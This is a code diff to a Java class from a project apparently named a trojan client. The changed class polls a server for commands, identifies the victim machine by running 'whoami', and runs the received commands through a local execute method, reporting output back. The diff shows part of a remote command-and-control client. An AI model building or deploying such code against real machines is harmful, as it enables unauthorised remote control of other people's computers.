@@ -1,5 +1,6 @@
 package ch.lebois.troyclient.functions;
 
+import ch.lebois.troyclient.service.GetContext;
 import ch.lebois.troyclient.service.Sender;
 import ch.lebois.troyclient.service.WebHandler;
 import java.io.BufferedReader;
@@ -9,22 +10,13 @@ import java.util.ArrayList;
 
 public class CommandReciver {
 
-    private String name;
-
-    private String url = "http://localhost:8080/command/";
     private WebHandler webHandler;
     private Sender sender;
 
-    public CommandReciver(String name) {
-        this.name = name;
-        setUrl(url + name);
-    }
-
-
-    public void setUrl(String url) {
-        this.url = url;
-        webHandler = new WebHandler(url);
-        sender = new Sender(name);
+    public CommandReciver() {
+        GetContext.CLIENT_NAME = execute("whoami").get(1).replace("\\", "-");
+        webHandler = new WebHandler(GetContext.URL + "/command/" + GetContext.CLIENT_NAME);
+        sender = new Sender();
     }
 
     public void readCommands() {
@@ -51,6 +43,7 @@ public class CommandReciver {
                                     }
                                 }
                             } catch (NullPointerException e) {
+                                e.printStackTrace();
                                 sender.send("errorout", "No command '" + command + "' found");
                             }
                             break;
@@ -61,12 +54,12 @@ public class CommandReciver {
                 }
             }
         } catch (NullPointerException | IndexOutOfBoundsException e) {
-            //TODO log no Commands
+//            e.printStackTrace();
         }
     }
 
 
-    public ArrayList<String> execute(String command) {
+    private ArrayList<String> execute(String command) {
 
         ArrayList<String> output = new ArrayList<>();
         try {
